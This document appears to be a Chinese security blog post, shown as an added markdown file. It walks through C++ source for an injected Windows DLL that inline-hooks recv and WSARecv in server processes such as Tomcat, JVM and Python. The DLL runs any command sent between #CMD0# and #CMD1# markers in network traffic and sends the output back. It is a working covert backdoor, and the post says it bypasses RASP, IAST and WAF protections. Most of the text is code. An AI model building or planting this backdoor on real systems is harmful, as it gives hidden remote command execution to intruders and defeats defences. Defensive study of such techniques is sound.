@@ -1,0 +1,133 @@
+> 标题中的 “通用” 指跨语言，本文的实现是基于 Windows 的，需要 Linux 的可以参考本文的思路，实现起来并没有太大区别。
+>
+> Author: [Jayl1n@Syclover](https://jayl1n.github.io)
+# 原理
+Windows 上程序涉及网络 socket 操作，一般都会用到 winsock2 的库，程序会动态链接 `ws2_32.dll`
+，JVM，Python，Zend 等解释器都不例外。
+winsock2 里 socket 操作相关的函数 `recv` `send` `closesocket` 会编程的应该都不陌生。 **hook
+掉`recv` 函数就可以在程序处理接受到网络数据前，进入我们的处理逻辑早一步收到数据。**
+由于实现是 native 的，所以在成功 hook 的情况下能绕过现代的 RASP、IAST、云WAF 等现代流行的防护技术。
+# Inline Hook
+Inline Hook 是在程序运行时直接修改指令，插入跳转指令（jmp/call/retn）来控制程序执行流的一种技术。相比别的 Hook
+技术，Inline Hook 优点是能跨平台，稳定，本文是以此技术实现的。
+# 实现
+具体实现分为两个部分，一个是hook函数的 DLL(只讲这个)；另一个是向进程注入 DLL 的辅助工具(github上有很多)。
+## InstallHook
+安装钩子
+    #define START_BLOCK "#CMD0#"
+    #define END_BLOCK "#CMD1#"
+    DWORD dwInstSize = 12;
+    BYTE RecvEntryPointInst[12] = { 0x00 };
+    BYTE RecvEntryPointInstHook[12] = { 0x48, 0xB8, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFF, 0xE0 };
+    BYTE WSARecvEntryPointInst[12] = { 0x00 };
+    BYTE WSARecvEntryPointInstHook[12] = { 0x48, 0xB8, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFF, 0xE0 };
+    typedef int ( *PFNRecv )( SOCKET, char*, int, int );
+    typedef int ( *PFNSend )( SOCKET, char*, int, int );
+    typedef int ( *PFNWSARecv ) ( SOCKET, LPWSABUF, DWORD, LPDWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE );
+    typedef int ( *PFNWSASend ) ( SOCKET, LPWSABUF, DWORD, LPDWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE );
+    void InstallHook(LPCWSTR lpModule, LPCSTR lpFuncName, LPVOID lpFunction) {
+        DWORD_PTR FuncAddress = (UINT64) GetProcAddress(GetModuleHandleW(lpModule), lpFuncName);
+        DWORD OldProtect = 0;
+        if(VirtualProtect((LPVOID) FuncAddress, dwInstSize, PAGE_EXECUTE_READWRITE, &OldProtect))
+        {
+            if(!strcmp(lpFuncName, "recv")) {
+                memcpy(RecvEntryPointInst, (LPVOID) FuncAddress, dwInstSize);
+                *(PINT64) ( RecvEntryPointInstHook + 2 ) = (UINT64) lpFunction;
+            }
+            if(!strcmp(lpFuncName, "WSARecv")) {
+                memcpy(WSARecvEntryPointInst, (LPVOID) FuncAddress, dwInstSize);
+                *(PINT64) ( WSARecvEntryPointInstHook + 2 ) = (UINT64) lpFunction;
+            }
+        }
+        if(!strcmp(lpFuncName, "recv")) 
+            memcpy((LPVOID) FuncAddress, &RecvEntryPointInstHook, sizeof(RecvEntryPointInstHook));
+        if(!strcmp(lpFuncName,"WSARecv"))
+            memcpy((LPVOID) FuncAddress, &WSARecvEntryPointInstHook, sizeof(WSARecvEntryPointInstHook));
+        VirtualProtect((LPVOID) FuncAddress, dwInstSize, OldProtect, &OldProtect);
+    }
+## UninstallHook
+卸载钩子
+    void UninstallHook(LPCWSTR lpModule, LPCSTR lpFuncName) {
+        UINT64 FuncAddress = (UINT64) GetProcAddress(GetModuleHandleW(lpModule), lpFuncName);
+        DWORD OldProtect = 0;
+        if(VirtualProtect((LPVOID) FuncAddress, dwInstSize, PAGE_EXECUTE_READWRITE, &OldProtect))
+        {
+            if(!strcmp(lpFuncName, "recv")) 
+                memcpy((LPVOID) FuncAddress, RecvEntryPointInst, sizeof(RecvEntryPointInst));
+            if(!strcmp(lpFuncName,"WSARecv"))
+                memcpy((LPVOID) FuncAddress, WSARecvEntryPointInst, sizeof(WSARecvEntryPointInst));
+        }
+        VirtualProtect((LPVOID) FuncAddress, dwInstSize, OldProtect, &OldProtect);
+    }
+## HookRecv
+hook recv 的函数，程序在执行 recv 时，会先进入这个函数。
+在这个函数里，调用原来的 recv 获取数据，判断是否有`START_BLOCK`、`END_BLOCK`块，有的话就取出块之间的命令，执行。
+    int WINAPI HookRecv(SOCKET s, char* buf, int len, int flags) {
+        UninstallHook(L"ws2_32.dll", "recv");
+        PFNRecv pfnRecv = (PFNRecv) GetProcAddress(GetModuleHandleW(L"ws2_32.dll"), "recv");
+        PFNSend pfnSend = (PFNSend) GetProcAddress(GetModuleHandleW(L"ws2_32.dll"), "send");
+        PFNClosesocket pfnClosesocket = (PFNClosesocket) GetProcAddress(GetModuleHandleW(L"ws2_32.dll"), "closesocket");
+        int rc = pfnRecv(s, buf, len, flags);
+        char* startBlock = strstr(buf, START_BLOCK);
+        if(startBlock) {
+            char* endBlock = strstr(startBlock, END_BLOCK);
+            if(endBlock) {
+                std::string start_block = std::string(startBlock);
+                int endOffset = start_block.find(END_BLOCK, sizeof(START_BLOCK));
+                std::string cmd = start_block.substr(sizeof(START_BLOCK) - 1, start_block.size() - sizeof(START_BLOCK) - ( start_block.size() - endOffset ) + 1);
+                std::string output = WSTR2STR(ExecuteCmd(cmd));
+                pfnSend(s, (char*) output.c_str(), output.size(), 0);
+             pfnClosesocket(s);
+            }
+        }
+        InstallHook(L"ws2_32.dll", "recv", (LPVOID) HookRecv);
+        return  rc;
+    }
+    int WINAPI HookWSARecv(SOCKET s, LPWSABUF lpBuffer, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine) {
+        UninstallHook(L"ws2_32.dll", "WSARecv");
+        PFNWSARecv pfnWSARecv = (PFNWSARecv) GetProcAddress(GetModuleHandleW(L"ws2_32.dll"), "WSARecv");
+        PFNWSASend pfnWSASend = (PFNWSASend) GetProcAddress(GetModuleHandleW(L"ws2_32.dll"), "WSASend");
+        PFNClosesocket pfnClosesocket = (PFNClosesocket) GetProcAddress(GetModuleHandleW(L"ws2_32.dll"), "closesocket");
+        int rc = pfnWSARecv(s, lpBuffer, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);
+        char* startBlock = strstr(lpBuffer->buf, START_BLOCK);
+        if(startBlock) {
+            char* endBlock = strstr(startBlock, END_BLOCK);
+            if(endBlock) {
+                std::string start_block = std::string(startBlock);
+                int endOffset = start_block.find(END_BLOCK, sizeof(START_BLOCK));
+                std::string cmd = start_block.substr(sizeof(START_BLOCK) - 1, start_block.size() - sizeof(START_BLOCK) - ( start_block.size() - endOffset ) + 1);
+                WSABUF outBuf;
+                std::string output = WSTR2STR(ExecuteCmd(cmd));
+                outBuf.buf = (char*) output.c_str();
+                outBuf.len = output.size();
+                pfnWSASend(s, &outBuf, 1, lpNumberOfBytesRecvd, 0, 0, 0);
+             pfnClosesocket(s);
+            }
+        }
+        InstallHook(L"ws2_32.dll", "WSARecv", (LPVOID) HookWSARecv);
+        return  rc;
+    }
+> 这里还 hook 了 `WSARecv` ，是因为我在 Tomcat 上测试遇到个问题 hook `recv` 后收到的数据是乱码，长度也对不上。
+> 后来想到 Tomcat 现在默认是 NIO 处理，JVM 的用的 API 可能不一样，翻看了一下源码，发现 Windows 上 NIO 相关的
+> socket 操作函数实际用的是 `WSARecv`、`WSASend` 等带 `WSA` 前缀的，加了 hook 点之后能正常读到数据了。
+## DllMain
+DLL 入口，调用安装钩子
+    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
+        switch(fdwReason)
+        {
+        case DLL_PROCESS_ATTACH:
+            InstallHook(L"ws2_32.dll", "recv", (LPVOID) HookRecv);
+            InstallHook(L"ws2_32.dll", "WSARecv", (LPVOID) HookWSARecv);
+            break;
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+        }
+        return TRUE;
+    }
+# 效果
+## Java
+## Python
